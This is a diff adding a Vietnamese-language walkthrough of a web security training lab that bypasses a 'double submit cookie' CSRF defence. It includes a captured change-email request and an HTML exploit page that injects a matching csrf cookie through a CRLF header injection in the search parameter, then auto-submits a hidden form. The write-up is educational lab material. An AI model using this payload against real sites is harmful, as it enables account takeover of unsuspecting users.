@@ -201,6 +201,50 @@ Khi người dùng truy cập vào URL này, trình duyệt sẽ lưu lại cook
 - Dán mã khai thác vào body 
 - Deliver to victim
 
+### Lab: CSRF where token is duplicated in cookie
+#### Analysis
+Là một cách đơn giản để bảo vệ khỏi CSRF mà:
+- Server không lưu trữ **CSRF token (stateless)**.
+- Khi người dùng đăng nhập, ứng dụng:
+    - Sinh ra một **CSRF token**.
+    - Gửi token này vào **cookie** (ví dụ: csrf=abc123).
+- Đồng thời, mỗi request (ví dụ: POST đổi email) phải đính kèm token trong body hoặc header (ví dụ: csrf=abc123 trong request body).
+- Nếu hai giá trị này trùng nhau, server chấp nhận request.
+
+Đây là cơ chế bảo vệ CSRF được gọi là **"double submit cookie"**
+
+#### Exploit
+- Login bằng tài khoản được cấp
+- Thực hiện chức năng **change-email**
+- Test việc thay đổi làm cho csrf khác nhau giữa **Header** và **Body**, sẽ nhận được `"Invalid CSRF token"`
+- Nhưng làm cho chúng giống nhau, không phải csrf ban đầu vẫn thực hiện được thay đổi email
+```http
+POST /my-account/change-email HTTP/2
+Host: 0ab800d604cd71ed80c403f400cc009b.web-security-academy.net
+Cookie: csrf=xnxx; session=pRQywNtRwp6nBB9KjblS1iTs4WNr3IGC
+...
+email=evil%40gmail.com&csrf=xnxx
+```
+
+=> Cho thấy server không lưu trữ csrf mà chỉ so sánh csrf giữa **Header** và **Body**
+- Tạo mã khai thác tưởng tự như lab trên nhưng thay đổi **csrf** để chúng có giá trị giống nhau
+```html
+  <form action="https://0ab800d604cd71ed80c403f400cc009b.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="csrf" value="xnxx">
+      <input type="hidden" name="email" value="evil@gmail.com">
+      <img src="https://0ab800d604cd71ed80c403f400cc009b.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=xnxx%3b%20SameSite=None" onerror="document.forms[0].submit()">    
+  </form>
+```
+- Response cho request **search**
+```http
+HTTP/2 200 OK
+Set-Cookie: LastSearchTerm=abc
+Set-Cookie: csrf=xnxx; SameSite=None; Secure; HttpOnly
+```
+- Đến **Exploit Server**
+- Dán mã khai thác vào body 
+- Deliver to victim
+
 
 ## Prevent
 ---
